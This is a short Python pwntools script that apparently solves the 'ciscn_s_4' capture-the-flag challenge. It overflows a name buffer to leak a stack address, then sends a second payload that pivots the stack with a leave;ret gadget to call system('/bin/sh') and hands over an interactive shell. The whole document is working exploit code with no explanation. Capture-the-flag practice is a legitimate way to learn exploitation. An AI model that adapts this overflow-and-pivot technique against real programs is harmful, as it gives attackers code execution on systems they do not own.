from pwn import *
context.log_level = 'debug'
elf = ELF('./ciscn_s_4')
io = process('./ciscn_s_4')
#io = gdb.debug('./ciscn_s_4')
padding = b'A'*0x27+b'B'
payload1 = padding
leave_ret = 0x08048562
io.sendafter(b'Welcome, my friend. What\'s your name?\n',payload1)
io.recvuntil(b'B')
s_addr = u32(io.recv(4))-0x38
print('s_addr->',hex(s_addr))

payload2 = p32(0)+p32(elf.plt['system'])+p32(0)+p32(s_addr+0x10)+b'/bin/sh\x00'
payload2 = payload2.ljust(0x28,b'\x00')
payload2 += p32(s_addr)+p32(leave_ret)
io.send(payload2)

io.interactive()
